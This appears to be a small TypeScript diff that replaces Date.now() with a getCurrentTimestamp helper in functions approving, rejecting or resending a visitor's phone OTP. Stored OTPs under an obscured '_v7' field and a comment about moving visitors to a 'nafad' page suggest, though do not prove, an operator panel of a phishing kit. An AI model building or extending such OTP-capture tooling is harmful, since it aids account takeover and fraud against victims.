@@ -4,6 +4,7 @@
 
 import { updateApplication } from "./firebase-services"
 import type { HistoryEntry } from "./history-helpers"
+import { getCurrentTimestamp } from "./time-utils"
 
 /**
  * Update the status of a history entry
@@ -107,7 +108,7 @@ export async function handlePhoneOtpApproval(
   // Move to nafad page
   await updateApplication(visitorId, {
     phoneOtpStatus: "approved" as any,
-    phoneOtpStatusUpdatedAt: Date.now(),
+    phoneOtpStatusUpdatedAt: getCurrentTimestamp(),
   })
 }
 
@@ -127,7 +128,7 @@ export async function handlePhoneOtpRejection(
     _v7: "", // phoneOtp
     phoneOtp: "",
     phoneOtpStatus: "show_phone_otp" as any,
-    phoneOtpStatusUpdatedAt: Date.now(),
+    phoneOtpStatusUpdatedAt: getCurrentTimestamp(),
   })
 }
 
@@ -139,6 +140,6 @@ export async function handlePhoneOtpResend(visitorId: string): Promise<void> {
     _v7: "", // phoneOtp
     phoneOtp: "",
     phoneOtpStatus: "show_phone_otp" as any,
-    phoneOtpStatusUpdatedAt: Date.now(),
+    phoneOtpStatusUpdatedAt: getCurrentTimestamp(),
   })
 }
